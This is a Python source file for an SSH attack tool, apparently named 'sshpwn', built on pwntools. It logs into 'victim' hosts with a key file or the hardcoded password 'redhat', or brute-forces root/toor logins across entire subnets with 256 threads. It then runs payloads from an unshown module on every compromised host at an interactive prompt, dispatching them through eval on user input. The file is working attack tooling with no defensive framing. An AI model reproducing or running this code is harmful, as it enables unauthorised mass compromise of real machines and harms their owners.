#!/usr/bin/python3

from pwn import *
import sys
import misc.coloredstatus as cs
from payloads.fun import *
import threading
from queue import Queue
import time

def getvictimlist(configs):
    mode = input("\n" + cs.status + " Enter 's' for single-user mode, 'm' for multi-user mode, 'b' for brute force mode: ")
    
    victims = []
    if mode == 's':
        RUSER = input(cs.status + " Enter remote user: ")
        RHOST = input(cs.status + " Enter remote host: ")
        try:
            victims.append(ssh(user=RUSER, host=RHOST, keyfile=configs["KeyFile"]))
            return victims, 0
        except:
            return None, 2

    elif mode == 'm':
        print(cs.status, "Using", configs["HostFileForMultiUser"], "file")
        victimlist = list(entry.strip().split(" ") for entry in open(configs["HostFileForMultiUser"], "r") if entry.strip())

        for victimentry in victimlist:
            try:
                victims.append(ssh(user=victimentry[0], host=victimentry[1], password="redhat", keyfile=configs["KeyFile"]))
            except:
                continue
        if len(victims) == 0:
            print(cs.error, "Unable to connect to anyone in", configs["HostFileForMultiUser"], "file")
            return None, 2

        for victim in victims:
            print(cs.good, "Connected to", victim.host)
        print(cs.status, "Total connected users:", len(victims))
        return victims, 0

    elif mode == 'b':
        def bruteforce(ip):
            try:
                s = ssh(user=login, host=ip, password=password, timeout=2)
                victims.append(s)
            except:
                pass

        def threader():
            while True:
                ip = q.get()
                bruteforce(ip)
                q.task_done()

        # Configurations
        login = input(cs.status + " Enter username to use (root): ")
        login = "root" if not login else login

        password = input(cs.status + " Enter password to use (toor): ")
        password = "toor" if not password else password

        network = input(cs.status + " Enter network: (192.168.1) (comma seperate multiple): ")
        network = "192.168.1" if not network else network
        network = list(networkportion.strip() + "." for networkportion in network.split(","))
        
        threads = input(cs.status + " Enter number of threads to use (256): ")
        threads = 256 if not threads else int(threads)

        # Variables
        q = Queue()
        victims = []
        # print_lock = threading.Lock()

        # Threading
        start = time.time()

        print(cs.status, "Prepping targets...")
        for workers in range(threads):
            t = threading.Thread(target=threader)
            t.daemon = True
            t.start()

        print(cs.status, "Brute force starting...")
        if network[0].count('.') == 3:
            for networkportion in network:
                for digit in range(255):
                    q.put(networkportion + str(digit))
        else:
            for networkportion in network:
                    for i in range(12, 14):
                        for k in range(255):
                            q.put(networkportion + str(i) + '.' + str(k))

        q.join()
        print(cs.status, "Brute force time taken: ", '{:.2f}'.format(time.time() - start), "seconds\n")
        # Threading End

        # Consolidate Victims
        if len(victims) == 0:
            print(cs.error, "Unable to connect to anyone in", configs["HostFileForMultiUser"], "file")
            return None, 2
        
        for victim in victims:
            print(cs.good, "Connected to", victim.host)
        print(cs.status, "Total connected users:", len(victims))
        return victims, 0

    else:
        print(cs.error, "Unknown mode '" + mode + "'")
        return None, 2

def builtincmd(cmd):
    if not cmd:
        return 2
    elif cmd == "back":
        return 1
    elif cmd == "exit" or cmd == "quit":
        print(cs.status, "Exiting...")
        sys.exit(0)
    elif cmd == "help":
        print("back, exit, quit")
        return 2
    else:
        return

def execute(cmd, victim, configs, params=None):
    try:
        result = eval(cmd + ".execute(victim, configs, params)")
    except NameError:
        print(cs.error, "Payload not found!")
        return 1

    if result == 0:
        print(cs.special, "Payload successful on", victim.host)
        return 0
    elif result == 1:
        return 1
    else:
        print(cs.error, "Payload failed on", victim.host)
        return 2

def main():
    print(cs.good, "Loaded payloads")

    configs = dict(config.strip().split(" ") for config in open("config", "r") if config.strip())
    print(cs.good, "Loaded config file")

    try:
        while True:
            victims, getvictimscode = getvictimlist(configs)
            if getvictimscode == 2:
                continue

            while True:
                sshpwncmd = input("\n" + cs.command + " sshpwn > ")
                sshpwntokens = sshpwncmd.split(" ", 1)

                builtincmdcode = builtincmd(sshpwntokens[0])
                if builtincmdcode == 1:
                    break
                elif builtincmdcode == 2:
                    continue
            
                for victim in victims:
                    if len(sshpwntokens) == 1:
                        exitcode = execute(sshpwntokens[0], victim, configs)
                    else:
                        exitcode = execute(sshpwntokens[0], victim, configs, sshpwntokens[1])
                    if exitcode == 1:
                        break
                    elif exitcode == 2:
                        continue    

    except KeyboardInterrupt:
        print(cs.status, "Exiting...")

if __name__ == "__main__":
    main()
